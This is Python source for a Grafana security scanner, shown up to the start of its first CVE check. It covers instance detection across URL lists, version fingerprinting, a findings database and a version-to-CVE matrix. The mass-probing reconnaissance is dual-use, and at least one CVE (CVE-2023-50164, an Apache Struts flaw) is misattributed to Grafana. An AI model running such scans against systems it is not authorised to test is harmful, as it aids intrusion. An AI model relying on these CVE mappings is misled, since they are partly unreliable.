#!/usr/bin/env python3
"""
Grafana Final Scanner v3.0
===========================
Professional-grade security assessment tool for Grafana deployments.

Features:
  - 15+ CVE vulnerability checks with version-aware filtering
  - Auto-search: auto-detect Grafana instances from URL lists
  - Multi-source version fingerprinting (7+ endpoints)
  - Configuration security analysis (CORS, headers, plugins, auth)
  - Vulnerability management with persistent JSON database
  - Target management with scan history tracking
  - Built-in web server for viewing results
  - Multi-format reporting (JSON, HTML, CSV)
  - Parallel scanning with rate-limit handling
"""

import argparse
import atexit
import csv
import html
import json
import os
import re
import signal
import sys
import threading
import time
import concurrent.futures
from collections import defaultdict
from datetime import datetime
from io import StringIO
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple, Set
from urllib.parse import quote, urljoin, urlparse

import requests

# Try to import Flask (optional - needed for --serve mode)
try:
    from flask import Flask, jsonify, request, render_template_string, send_from_directory
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False


def _positive_int(value: str) -> int:
    """Argument type validator for positive integers"""
    ivalue = int(value)
    if ivalue < 1:
        raise argparse.ArgumentTypeError(f"Minimum value is 1, got {value}")
    return ivalue


# Disable SSL warnings for testing environments
requests.packages.urllib3.disable_warnings()

# Terminal color codes for professional output
class Colors:
    # Severity levels
    CRITICAL = '\033[1;91m'    # Bold Bright Red
    HIGH = '\033[1;31m'        # Bold Red
    MEDIUM = '\033[1;33m'      # Bold Yellow
    LOW = '\033[1;36m'         # Bold Cyan
    INFO = '\033[1;94m'        # Bold Blue
    
    # Status indicators
    VULN = '\033[1;91m'        # Vulnerability found
    SAFE = '\033[1;92m'        # Safe/Passed
    WARN = '\033[1;93m'        # Warning
    
    # Text formatting
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    # Special
    HEADER = '\033[1;95m'      # Magenta for headers
    SUCCESS = '\033[1;92m'     # Green for success
    CYAN = '\033[1;96m'        # Cyan
    PURPLE = '\033[1;35m'      # Purple


# =====================================================================
#  VULNERABILITY DATABASE MANAGER
# =====================================================================

class VulnerabilityDB:
    """
    Persistent vulnerability database using JSON file storage.
    
    Manages scan history, vulnerability records, and target tracking
    across multiple scan sessions.
    """
    
    def __init__(self, db_path: str = "vulndb.json"):
        self.db_path = db_path
        self.lock = threading.RLock()
        self._data = self._load()
    
    def _load(self) -> Dict:
        """Load database from disk"""
        try:
            if os.path.exists(self.db_path):
                with open(self.db_path, 'r') as f:
                    return json.load(f)
        except (json.JSONDecodeError, IOError) as e:
            print(f"{Colors.WARN}[!] Failed to load database: {e}{Colors.RESET}")
        return {
            "version": "3.0",
            "created": datetime.now().isoformat(),
            "updated": datetime.now().isoformat(),
            "targets": {},
            "vulnerabilities": [],
            "scan_history": []
        }
    
    def _save(self):
        """Save database to disk"""
        with self.lock:
            self._data["updated"] = datetime.now().isoformat()
            try:
                with open(self.db_path, 'w') as f:
                    json.dump(self._data, f, indent=2, default=str)
            except IOError as e:
                print(f"{Colors.WARN}[!] Failed to save database: {e}{Colors.RESET}")
    
    def add_target(self, url: str, version: Optional[str] = None,
                   metadata: Optional[Dict] = None) -> Dict:
        """Register a target in the database"""
        target_id = self._target_id(url)
        with self.lock:
            if target_id not in self._data["targets"]:
                self._data["targets"][target_id] = {
                    "url": url,
                    "first_seen": datetime.now().isoformat(),
                    "last_scanned": datetime.now().isoformat(),
                    "version": version,
                    "scan_count": 0,
                    "total_vulnerabilities": 0,
                    "critical_count": 0,
                    "high_count": 0,
                    "medium_count": 0,
                    "low_count": 0,
                    "risk_score": 0,
                    "tags": [],
                    "notes": "",
                    "metadata": metadata or {}
                }
            target = self._data["targets"][target_id]
            target["last_scanned"] = datetime.now().isoformat()
            target["scan_count"] += 1
            if version:
                target["version"] = version
            self._save()
            return target
    
    def add_vulnerability(self, vuln: Dict) -> Dict:
        """Record a vulnerability finding with deduplication"""
        vuln = dict(vuln)
        vuln["id"] = self._generate_vuln_id(vuln)
        vuln["discovered"] = datetime.now().isoformat()
        vuln["status"] = "open"  # open, confirmed, false_positive, fixed, accepted
        vuln["remediation"] = self._get_remediation(vuln.get("cve_id", ""))
        
        with self.lock:
            # Deduplicate: if same CVE + same target exists, update instead
            existing = None
            for i, v in enumerate(self._data["vulnerabilities"]):
                if (v.get("cve_id") == vuln.get("cve_id") and 
                    v.get("target_url") == vuln.get("target_url") and
                    v.get("status") == "open"):
                    existing = i
                    break
            
            if existing is not None:
                self._data["vulnerabilities"][existing].update(vuln)
                self._data["vulnerabilities"][existing]["last_seen"] = datetime.now().isoformat()
                idx = existing
            else:
                self._data["vulnerabilities"].append(vuln)
                idx = len(self._data["vulnerabilities"]) - 1
            
            # Update target counts
            target_id = self._target_id(vuln.get("target_url", ""))
            if target_id in self._data["targets"]:
                t = self._data["targets"][target_id]
                severity = vuln.get("severity", "").upper()
                t["total_vulnerabilities"] = sum(
                    1 for v in self._data["vulnerabilities"]
                    if v.get("target_url") == t["url"] and v.get("status") == "open"
                )
                t["critical_count"] = sum(
                    1 for v in self._data["vulnerabilities"]
                    if v.get("target_url") == t["url"] and v.get("status") == "open"
                    and v.get("severity") == "CRITICAL"
                )
                t["high_count"] = sum(
                    1 for v in self._data["vulnerabilities"]
                    if v.get("target_url") == t["url"] and v.get("status") == "open"
                    and v.get("severity") == "HIGH"
                )
                t["medium_count"] = sum(
                    1 for v in self._data["vulnerabilities"]
                    if v.get("target_url") == t["url"] and v.get("status") == "open"
                    and v.get("severity") == "MEDIUM"
                )
                t["low_count"] = sum(
                    1 for v in self._data["vulnerabilities"]
                    if v.get("target_url") == t["url"] and v.get("status") == "open"
                    and v.get("severity") == "LOW"
                )
                t["risk_score"] = self._calculate_risk_score(target_id)
            
            self._save()
        
        return vuln
    
    def add_scan_history(self, scan_result: Dict):
        """Record a scan execution in history"""
        record = {
            "timestamp": datetime.now().isoformat(),
            "target": scan_result.get("url", ""),
            "version": scan_result.get("version"),
            "vulnerabilities_found": len(scan_result.get("vulnerabilities", [])),
            "checks_performed": scan_result.get("statistics", {}).get("total_checks", 0),
            "duration_seconds": scan_result.get("duration", 0)
        }
        with self.lock:
            self._data["scan_history"].append(record)
            # Keep only last 1000 records
            if len(self._data["scan_history"]) > 1000:
                self._data["scan_history"] = self._data["scan_history"][-1000:]
            self._save()
    
    def get_target(self, url: str) -> Optional[Dict]:
        """Get target info by URL"""
        target_id = self._target_id(url)
        with self.lock:
            return self._data["targets"].get(target_id)
    
    def get_all_targets(self) -> List[Dict]:
        """Get all tracked targets"""
        with self.lock:
            return list(self._data["targets"].values())
    
    def get_open_vulnerabilities(self, target_url: Optional[str] = None) -> List[Dict]:
        """Get all open vulnerabilities, optionally filtered by target"""
        with self.lock:
            vulns = [v for v in self._data["vulnerabilities"] if v.get("status") == "open"]
            if target_url:
                tid = self._target_id(target_url)
                vulns = [v for v in vulns if self._target_id(v.get("target_url", "")) == tid]
            return vulns
    
    def get_all_vulnerabilities(self) -> List[Dict]:
        """Get all vulnerability records"""
        with self.lock:
            return list(self._data["vulnerabilities"])
    
    def update_vuln_status(self, vuln_id: str, status: str, notes: str = ""):
        """Update the status of a vulnerability"""
        with self.lock:
            for v in self._data["vulnerabilities"]:
                if v.get("id") == vuln_id:
                    v["status"] = status
                    if notes:
                        v["notes"] = notes
                    v["updated"] = datetime.now().isoformat()
                    
                    # Recalculate target risk scores
                    tid = self._target_id(v.get("target_url", ""))
                    if tid in self._data["targets"]:
                        t = self._data["targets"][tid]
                        t["total_vulnerabilities"] = sum(
                            1 for vv in self._data["vulnerabilities"]
                            if self._target_id(vv.get("target_url", "")) == tid
                            and vv.get("status") == "open"
                        )
                        t["risk_score"] = self._calculate_risk_score(tid)
                    
                    self._save()
                    return v
        return None
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        with self.lock:
            vulns = self._data["vulnerabilities"]
            open_vulns = [v for v in vulns if v.get("status") == "open"]
            return {
                "total_targets": len(self._data["targets"]),
                "total_vulnerabilities": len(vulns),
                "open_vulnerabilities": len(open_vulns),
                "by_severity": {
                    "CRITICAL": sum(1 for v in open_vulns if v.get("severity") == "CRITICAL"),
                    "HIGH": sum(1 for v in open_vulns if v.get("severity") == "HIGH"),
                    "MEDIUM": sum(1 for v in open_vulns if v.get("severity") == "MEDIUM"),
                    "LOW": sum(1 for v in open_vulns if v.get("severity") == "LOW"),
                },
                "total_scans": len(self._data["scan_history"]),
                "targets_at_risk": sum(1 for t in self._data["targets"].values() if t.get("risk_score", 0) > 0)
            }
    
    def _target_id(self, url: str) -> str:
        """Generate a stable target ID from URL"""
        parsed = urlparse(url if url.startswith(('http://', 'https://')) else f'https://{url}')
        return f"{parsed.netloc}{parsed.path}".rstrip('/') or parsed.netloc
    
    def _generate_vuln_id(self, vuln: Dict) -> str:
        """Generate a unique vulnerability ID"""
        cve = vuln.get("cve_id", "UNKNOWN")
        target = self._target_id(vuln.get("target_url", ""))
        ts = datetime.now().strftime("%Y%m%d%H%M%S")
        return f"{cve}_{target}_{ts}"
    
    def _get_remediation(self, cve_id: str) -> str:
        """Get remediation advice for a CVE"""
        remediation_map = {
            "CVE-2021-43798": "Upgrade to Grafana 8.3.1+ immediately",
            "CVE-2025-4123": "Apply security patches; upgrade to Grafana 12.0.0+",
            "CVE-2024-9264": "Upgrade to Grafana 11.0.6+, 11.1.7+, or 11.2.2+",
            "CVE-2024-8118": "Upgrade to Grafana 11.0.6+, 11.1.8+, or 11.2.2+",
            "CVE-2023-50164": "Upgrade to Grafana 9.2.10+, 9.3.6+, or 9.4.1+",
            "CVE-2023-1410": "Upgrade to Grafana 9.2.17+, 9.3.5+, or apply WAF rules",
            "CVE-2023-2183": "Upgrade to Grafana 8.5.21+ or 9.4.13+",
            "CVE-2018-15727": "Upgrade to Grafana 5.2.3+ or migrate to newer version",
            "CVE-2021-27358": "Upgrade to Grafana 7.4.2+",
            "CVE-2020-11110": "Upgrade to Grafana 6.7.0+",
            "CVE-2021-41174": "Upgrade to Grafana 8.3.1+",
            "CVE-2021-39226": "Upgrade to Grafana 8.3.1+",
            "CVE-2024-1313": "Upgrade to latest patched version for your major release",
            "CVE-2022-32275": "Upgrade from version 8.4.3 to a patched version",
            "CVE-2022-32276": "Upgrade from version 8.4.3 to a patched version",
        }
        return remediation_map.get(cve_id, "Review Grafana security advisories and upgrade to latest version")
    
    def _calculate_risk_score(self, target_id: str) -> int:
        """Calculate risk score (0-100) for a target"""
        target = self._data["targets"].get(target_id)
        if not target:
            return 0
        
        score = 0
        for v in self._data["vulnerabilities"]:
            if self._target_id(v.get("target_url", "")) == target_id and v.get("status") == "open":
                sev = v.get("severity", "").upper()
                if sev == "CRITICAL":
                    score += 25
                elif sev == "HIGH":
                    score += 15
                elif sev == "MEDIUM":
                    score += 8
                elif sev == "LOW":
                    score += 3
        
        return min(score, 100)


# =====================================================================
#  GRAFANA SCANNER ENGINE
# =====================================================================

class GrafanaFinalScanner:
    """
    Advanced Grafana Security Scanner
    
    Performs comprehensive security assessments of Grafana instances including:
    - CVE vulnerability detection with version validation
    - Configuration security analysis
    - Information disclosure checks
    - Authentication mechanism assessment
    - API key exposure detection
    - Security headers analysis
    - False positive reduction with multi-indicator validation
    """
    
    # Grafana identification fingerprints
    GRAFANA_ENDPOINTS = [
        '/api/health',
        '/api/frontend/settings',
        '/login',
        '/grafana/api/dashboards/home',
        '/api/org',
        '/api/user/signup',
    ]
    
    GRAFANA_HTML_INDICATORS = [
        'grafana', 'grafana-app', 'grafana-boot-data',
        'window.grafanaBootData', 'data-grafana-version',
        'grafana-version', 'grafana-app-shell',
        'grafana-login-page', 'grafana-dashboard',
        '/public/build/grafana', 'app.constant\\("grafana',
        'grafana_build_info', 'grafana-live',
    ]
    
    GRAFANA_API_INDICATORS = {
        '/api/health': ['database', 'version'],
        '/api/frontend/settings': ['buildInfo', 'auth'],
    }
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False,
                 auth_token: Optional[str] = None, auth_user: Optional[str] = None,
                 auth_pass: Optional[str] = None, max_threads: int = 5,
                 db_path: Optional[str] = None):
        """
        Initialize the scanner with configuration parameters
        
        Args:
            timeout: HTTP request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            verbose: Enable detailed logging output
            auth_token: Bearer token for authenticated endpoints
            auth_user: Username for basic authentication
            auth_pass: Password for basic authentication
            max_threads: Maximum threads for concurrent scanning
            db_path: Path to vulnerability database JSON file
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Configure authentication
        self._print_lock = threading.Lock()
        self._configure_auth(auth_token, auth_user, auth_pass)
        
        # Version detection cache
        self.grafana_version = None
        self.build_info = {}
        self.detected_plugins = []
        
        # Statistics
        self.stats = {
            'total_checks': 0,
            'vulnerabilities_found': 0,
            'checks_passed': 0,
            'errors': 0
        }
        
        # Rate limiting awareness
        self._rate_limited = False
        
        # Vulnerability database
        self.vulndb = VulnerabilityDB(db_path) if db_path else None
    
    def _configure_auth(self, auth_token: Optional[str] = None,
                        auth_user: Optional[str] = None,
                        auth_pass: Optional[str] = None):
        """Configure authentication for the session"""
        if auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {auth_token}'
            })
            self.log("Bearer token authentication configured", "INFO")
        
        if auth_user and auth_pass:
            self.session.auth = (auth_user, auth_pass)
            self.log("Basic authentication configured", "INFO")
    
    def log(self, message: str, level: str = "INFO", indent: int = 0):
        """
        Enhanced logging with color coding and hierarchical indentation
        
        Args:
            message: The message to log
            level: Severity level (INFO, VULN, SAFE, WARN, etc.)
            indent: Indentation level for hierarchical output
        """
        timestamp = datetime.now().strftime("%H:%M:%S")
        indent_str = "  " * indent
        
        level_config = {
            'CRITICAL': (Colors.CRITICAL, '🔴', '[CRITICAL]'),
            'HIGH': (Colors.HIGH, '🟠', '[HIGH]'),
            'MEDIUM': (Colors.MEDIUM, '🟡', '[MEDIUM]'),
            'LOW': (Colors.LOW, '🔵', '[LOW]'),
            'INFO': (Colors.INFO, 'ℹ', '[INFO]'),
            'VULN': (Colors.VULN, '⚠️', '[VULN]'),
            'SAFE': (Colors.SAFE, '✓', '[SAFE]'),
            'WARN': (Colors.WARN, '⚡', '[WARN]'),
            'ERROR': (Colors.CRITICAL, '✗', '[ERROR]'),
            'SUCCESS': (Colors.SUCCESS, '✓', '[OK]'),
        }
        
        color, symbol, prefix = level_config.get(level, (Colors.RESET, '•', f'[{level}]'))
        
        if self.verbose:
            output = f"{Colors.DIM}[{timestamp}]{Colors.RESET} {indent_str}{symbol} {color}{prefix}{Colors.RESET} {message}"
        else:
            output = f"{indent_str}{symbol} {color}{prefix}{Colors.RESET} {message}"
        
        with self._print_lock:
            print(output)
    
    def _check_rate_limit(self, response) -> bool:
        """Check if we're being rate limited"""
        if response.status_code == 429:
            self._rate_limited = True
            return True
        if response.headers.get('X-RateLimit-Remaining') == '0':
            self._rate_limited = True
            return True
        if response.headers.get('Retry-After'):
            self._rate_limited = True
            return True
        try:
            data = response.json()
            if isinstance(data, dict):
                msg = str(data.get('message', '') + data.get('error', '')).lower()
                if 'rate limit' in msg or 'too many requests' in msg:
                    self._rate_limited = True
                    return True
        except:
            pass
        return False
    
    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """
        Safe HTTP request with retry and rate-limit handling
        """
        if self._rate_limited:
            self.log("Rate limited - skipping remaining requests", "WARN", 2)
            return None
        
        retries = 2
        for attempt in range(retries):
            try:
                kwargs.setdefault('timeout', self.timeout)
                kwargs.setdefault('verify', self.verify_ssl)
                kwargs.setdefault('allow_redirects', True)
                
                response = self.session.request(method, url, **kwargs)
                
                if self._check_rate_limit(response):
                    self.log("Rate limit detected - waiting before retry...", "WARN", 2)
                    time.sleep(5)
                    continue
                
                return response
                
            except requests.exceptions.Timeout:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                if self.verbose:
                    self.log(f"Request timeout: {url}", "INFO", 3)
            except requests.exceptions.ConnectionError as e:
                if self.verbose:
                    self.log(f"Connection error: {str(e)}", "INFO", 3)
                return None
            except Exception as e:
                if self.verbose:
                    self.log(f"Request error: {str(e)}", "INFO", 3)
                return None
        
        return None
    
    # =================================================================
    #  GRAFANA DETECTION (for auto-search)
    # =================================================================
    
    def is_grafana_instance(self, url: str) -> Tuple[bool, float, Optional[str]]:
        """
        Detect if a URL is a Grafana instance using multiple detection methods.
        
        Strategy:
        1. Quick probe: check /api/health for Grafana-specific JSON
        2. HTML check: look for Grafana indicators in page content
        3. API check: probe multiple Grafana-specific endpoints
        4. Score-based decision with confidence rating
        
        Returns:
            Tuple of (is_grafana, confidence_score_0_to_1, detected_version_or_None)
        """
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        confidence = 0.0
        version = None
        indicators_found = []
        
        # Method 1: Quick API health check (highest confidence)
        try:
            health_url = urljoin(url, '/api/health')
            resp = self._safe_request('GET', health_url, timeout=min(self.timeout, 5))
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if isinstance(data, dict):
                        if 'database' in data and 'version' in data:
                            confidence += 0.5
                            version = data.get('version', version)
                            indicators_found.append('api_health')
                        elif 'database' in data:
                            confidence += 0.3
                            indicators_found.append('api_health_partial')
                except:
                    pass
        except:
            pass
        
        # Method 2: Check login page for Grafana HTML indicators
        try:
            login_url = urljoin(url, '/login')
            resp = self._safe_request('GET', login_url, timeout=min(self.timeout, 5))
            if resp and resp.status_code == 200:
                text_lower = resp.text.lower()
                for indicator in self.GRAFANA_HTML_INDICATORS:
                    if indicator.lower() in text_lower:
                        confidence += 0.1
                        indicators_found.append(f'html_{indicator[:20]}')
                        if not version:
                            # Try to extract version from the page
                            version = self._parse_login_page(resp)
                        break  # Count HTML indicators as one hit
        except:
            pass
        
        # Method 3: Check frontend settings API
        if confidence < 0.8:
            try:
                fs_url = urljoin(url, '/api/frontend/settings')
                resp = self._safe_request('GET', fs_url, timeout=min(self.timeout, 5))
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                        if isinstance(data, dict):
                            if 'buildInfo' in data:
                                confidence += 0.4
                                if not version:
                                    version = data['buildInfo'].get('version', version)
                                indicators_found.append('frontend_settings')
                    except:
                        pass
            except:
                pass
        
        # Method 4: Check multiple Grafana endpoints
        if confidence < 0.7:
            for endpoint in ['/api/org', '/api/user/signup', '/grafana/api/dashboards/home']:
                try:
                    test_url = urljoin(url, endpoint)
                    resp = self._safe_request('GET', test_url, timeout=min(self.timeout, 3))
                    if resp and resp.status_code in [200, 401, 403]:
                        # Any response from Grafana-specific endpoints is a strong indicator
                        try:
                            data = resp.json()
                            if isinstance(data, (dict, list)):
                                confidence += 0.2
                                indicators_found.append(f'api_{endpoint[5:15]}')
                                break
                        except:
                            confidence += 0.1
                            indicators_found.append(f'api_resp_{endpoint[5:15]}')
                            break
                except:
                    continue
        
        # Method 5: Response headers check
        if confidence < 0.5:
            try:
                resp = self._safe_request('GET', url, timeout=min(self.timeout, 5))
                if resp:
                    headers_str = str(resp.headers).lower()
                    if 'grafana' in headers_str:
                        confidence += 0.2
                        indicators_found.append('grafana_header')
            except:
                pass
        
        is_grafana = confidence >= 0.3  # Minimum threshold
        score = min(confidence, 1.0)
        
        if self.verbose and is_grafana:
            self.log(f"Grafana detected: confidence={score:.2f}, indicators={indicators_found}, version={version}", "INFO", 2)
        
        return is_grafana, score, version
    
    def auto_search_from_file(self, filename: str, **scan_kwargs) -> List[Dict]:
        """
        Auto-detect Grafana instances from a file containing URLs.
        
        Reads all URLs from the file, probes each one to detect if it's
        a Grafana instance, then scans only confirmed Grafana instances.
        
        Args:
            filename: Path to file containing URLs (one per line)
            **scan_kwargs: Additional arguments passed to scan_target
            
        Returns:
            List of scan results for detected Grafana instances
        """
        try:
            with open(filename, 'r') as f:
                all_urls = [line.strip() for line in f 
                           if line.strip() and not line.startswith('#') and 
                           not line.startswith('//')]
        except FileNotFoundError:
            self.log(f"File not found: {filename}", "ERROR")
            sys.exit(1)
        except Exception as e:
            self.log(f"Error reading file: {str(e)}", "ERROR")
            sys.exit(1)
        
        self.log(f"Auto-search: loaded {len(all_urls)} URLs from {filename}", "INFO")
        print()
        self.log(f"{'─'*60}", "INFO")
        self.log("Phase 1: Grafana Instance Detection", "INFO")
        self.log(f"{'─'*60}", "INFO")
        print()
        
        # Detect Grafana instances in parallel
        grafana_urls = []
        detection_lock = threading.Lock()
        
        def probe_url(url: str) -> Optional[Tuple[str, float, Optional[str]]]:
            try:
                is_g, conf, ver = self.is_grafana_instance(url)
                if is_g:
                    return (url, conf, ver)
            except:
                pass
            return None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {executor.submit(probe_url, url): url for url in all_urls}
            completed = 0
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                url = futures[future]
                result = future.result()
                if result:
                    grafana_urls.append(result)
                    self.log(f"[{completed}/{len(all_urls)}] ✓ Grafana detected: {url}", "SUCCESS", 1)
                else:
                    if self.verbose:
                        self.log(f"[{completed}/{len(all_urls)}] ✗ Not Grafana: {url}", "DIM", 1)
                    else:
                        # Progress indicator without verbose
                        if completed % 10 == 0 or completed == len(all_urls):
                            self.log(f"Progress: {completed}/{len(all_urls)} URLs checked...", "INFO")
        
        print()
        self.log(f"{'─'*60}", "INFO")
        self.log(f"Detection complete: {len(grafana_urls)}/{len(all_urls)} Grafana instances found", "INFO")
        self.log(f"{'─'*60}", "INFO")
        print()
        
        if not grafana_urls:
            self.log("No Grafana instances detected in the provided URLs", "WARN")
            return []
        
        # Scan detected Grafana instances
        results = []
        for i, (url, confidence, version) in enumerate(grafana_urls, 1):
            self.log(f"Scanning Grafana [{i}/{len(grafana_urls)}]: {url} (confidence: {confidence:.0%})", "INFO")
            result = self.scan_target(url)
            results.append(result)
            
            if i < len(grafana_urls) and not self._rate_limited:
                time.sleep(0.5)
        
        return results
    
    # =================================================================
    #  VERSION DETECTION
    # =================================================================
    
    def detect_grafana_version(self, base_url: str) -> Optional[str]:
        """
        Multi-source version detection with fallback strategies
        
        Attempts to detect Grafana version from:
        1. /api/frontend/settings (buildInfo)
        2. /api/health endpoint
        3. Login page metadata
        4. Build artifacts
        5. Error pages
        6. API response headers
        
        Returns:
            Version string (e.g., "11.2.0") or None if detection fails
        """
        self.log("Initiating version fingerprinting...", "INFO", 1)
        
        detection_methods = [
            {
                'endpoint': '/api/frontend/settings',
                'method': 'GET',
                'parser': self._parse_frontend_settings
            },
            {
                'endpoint': '/api/health',
                'method': 'GET',
                'parser': self._parse_health_endpoint
            },
            {
                'endpoint': '/login',
                'method': 'GET',
                'parser': self._parse_login_page
            },
            {
                'endpoint': '/api/org',
                'method': 'GET',
                'parser': self._parse_api_response
            },
            {
                'endpoint': '/api/user/signup',
                'method': 'GET',
                'parser': self._parse_api_response
            },
            {
                'endpoint': '/api/annotations',
                'method': 'GET',
                'parser': self._parse_version_header_only
            },
            {
                'endpoint': '/grafana/api/dashboards/home',
                'method': 'GET',
                'parser': self._parse_api_response
            }
        ]
        
        for method_config in detection_methods:
            try:
                url = urljoin(base_url, method_config['endpoint'])
                response = self._safe_request(
                    method_config['method'],
                    url,
                    allow_redirects=True
                )
                
                if response and response.status_code == 200:
                    version = method_config['parser'](response)
                    if version:
                        self.grafana_version = version
                        self.log(f"Version detected: {Colors.BOLD}Grafana v{version}{Colors.RESET}", "SUCCESS", 1)
                        return version
                        
            except Exception as e:
                if self.verbose:
                    self.log(f"Method {method_config['endpoint']} failed: {str(e)}", "INFO", 2)
                continue
        
        self.log("Version detection unsuccessful - proceeding with comprehensive scan", "WARN", 1)
        return None
    
    def _parse_frontend_settings(self, response) -> Optional[str]:
        """Parse version from /api/frontend/settings"""
        try:
            data = response.json()
            if 'buildInfo' in data and 'version' in data['buildInfo']:
                self.build_info = data['buildInfo']
                return data['buildInfo']['version']
        except:
            pass
        return None
    
    def _parse_health_endpoint(self, response) -> Optional[str]:
        """Parse version from /api/health"""
        try:
            data = response.json()
            if 'version' in data:
                return data['version']
        except:
            pass
        return None
    
    def _parse_login_page(self, response) -> Optional[str]:
        """Parse version from login page HTML/JavaScript"""
        try:
            patterns = [
                r'"(?:version|grafanaVersion)"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+(?:[-_][a-zA-Z0-9]+)?)"',
                r'window\.grafanaBootData\s*=\s*{[^}]*"version"\s*:\s*"([0-9.]+)"',
                r'Grafana\s+v([0-9]+\.[0-9]+\.[0-9]+)',
                r'data-grafana-version="([0-9.]+)"',
                r'"buildVersion"\s*:\s*"([^"]+)"',
                r'"gitVersion"\s*:\s*"([^"]+)"',
                r'"grafana_version"\s*:\s*"([^"]+)"',
                r'<meta\s+name="grafana-version"\s+content="([^"]+)"',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def _parse_api_response(self, response) -> Optional[str]:
        """Parse version from generic API responses"""
        try:
            version_header = self._parse_version_header_only(response)
            if version_header:
                return version_header
            
            data = response.json()
            if isinstance(data, dict):
                for key in ['version', 'buildVersion', 'grafanaVersion']:
                    if key in data and isinstance(data[key], str):
                        if re.match(r'^[0-9]+\.[0-9]+', data[key]):
                            return data[key]
        except:
            pass
        return None
    
    def _parse_version_header_only(self, response) -> Optional[str]:
        """Parse version from response headers only"""
        try:
            for header in ['X-Grafana-Version', 'X-Grafana-Build-Version']:
                if header in response.headers:
                    version = response.headers[header]
                    if re.match(r'^[0-9]+\.[0-9]+', version):
                        return version
        except:
            pass
        return None
    
    def compare_versions(self, version_a: str, version_b: str) -> int:
        """
        Compare two version strings
        Returns: -1 if a < b, 0 if a == b, 1 if a > b
        """
        def parse_version(v: str) -> List[int]:
            v = re.sub(r'[-_].*$', '', v)
            parts = []
            for part in v.split('.'):
                try:
                    parts.append(int(part))
                except ValueError:
                    parts.append(0)
            while len(parts) < 3:
                parts.append(0)
            return parts[:3]
        
        a_parts = parse_version(version_a)
        b_parts = parse_version(version_b)
        
        for i in range(3):
            if a_parts[i] < b_parts[i]:
                return -1
            elif a_parts[i] > b_parts[i]:
                return 1
        return 0
    
    def version_in_range(self, version: str, min_v: Optional[str] = None, max_v: Optional[str] = None) -> bool:
        """Check if version is within a range (inclusive)"""
        if not version:
            return False
        
        if min_v and self.compare_versions(version, min_v) < 0:
            return False
        
        if max_v and self.compare_versions(version, max_v) > 0:
            return False
        
        return True
    
    def is_version_vulnerable(self, cve_id: str) -> bool:
        """
        Determine if detected version is vulnerable to specific CVE
        
        Uses version range mapping and special case handling for each CVE
        """
        if not self.grafana_version:
            return True  # Unknown version = assume vulnerable for thoroughness
        
        try:
            v = self.grafana_version
            
            vulnerability_matrix = {
                'CVE-2025-4123': lambda: (
                    self.compare_versions(v, '12.0.0') < 0
                ),
                'CVE-2024-9264': lambda: (
                    self.version_in_range(v, '11.0.0', '11.0.5') or
                    self.version_in_range(v, '11.1.0', '11.1.6') or
                    self.version_in_range(v, '11.2.0', '11.2.1')
                ),
                'CVE-2021-43798': lambda: (
                    self.version_in_range(v, '8.0.0', '8.3.0')
                ),
                'CVE-2022-32275': lambda: v == '8.4.3',
                'CVE-2022-32276': lambda: v == '8.4.3',
                'CVE-2021-27358': lambda: (
                    self.version_in_range(v, '6.7.3', '7.4.1')
                ),
                'CVE-2020-11110': lambda: self.compare_versions(v, '6.7.0') < 0,
                'CVE-2021-41174': lambda: (
                    self.compare_versions(v, '8.0.0') >= 0 and
                    self.compare_versions(v, '8.3.0') <= 0
                ),
                'CVE-2021-39226': lambda: (
                    self.compare_versions(v, '8.0.0') >= 0 and
                    self.compare_versions(v, '8.3.0') <= 0
                ),
                'CVE-2018-15727': lambda: (
                    self.compare_versions(v, '5.2.2') <= 0
                ),
                'CVE-2023-50164': lambda: (
                    self.version_in_range(v, '0.0.0', '9.2.9') or
                    self.version_in_range(v, '9.3.0', '9.3.5') or
                    self.version_in_range(v, '9.4.0', '9.4.0')
                ),
                'CVE-2023-1410': lambda: (
                    self.compare_versions(v, '8.0.0') >= 0 and (
                        self.version_in_range(v, '8.0.0', '9.2.16') or
                        self.version_in_range(v, '9.3.0', '9.3.4')
                    )
                ),
                'CVE-2023-2183': lambda: (
                    (v.startswith('8.') and self.compare_versions(v, '8.5.21') < 0) or
                    (v.startswith('9.') and self.compare_versions(v, '9.4.13') < 0)
                ),
                'CVE-2024-1313': lambda: (
                    self.version_in_range(v, '8.0.0', '8.5.17') or
                    self.version_in_range(v, '9.0.0', '9.2.14') or
                    self.version_in_range(v, '9.3.0', '9.3.11') or
                    self.version_in_range(v, '9.4.0', '9.4.10') or
                    self.version_in_range(v, '9.5.0', '9.5.6')
                ),
                'CVE-2024-8118': lambda: (
                    self.version_in_range(v, '11.0.0', '11.0.5') or
                    self.version_in_range(v, '11.1.0', '11.1.7') or
                    self.version_in_range(v, '11.2.0', '11.2.1')
                )
            }
            
            check_func = vulnerability_matrix.get(cve_id)
            if check_func:
                return check_func()
                
        except Exception as e:
            if self.verbose:
                self.log(f"Version check error for {cve_id}: {str(e)}", "WARN", 2)
        
        return True  # Default to vulnerable if uncertain
    
    # =================================================================
    #  CVE CHECKS
    # =================================================================
    
    def check_cve_2021_43798(self, base_url: str) -> Tuple[bool, str, str]:
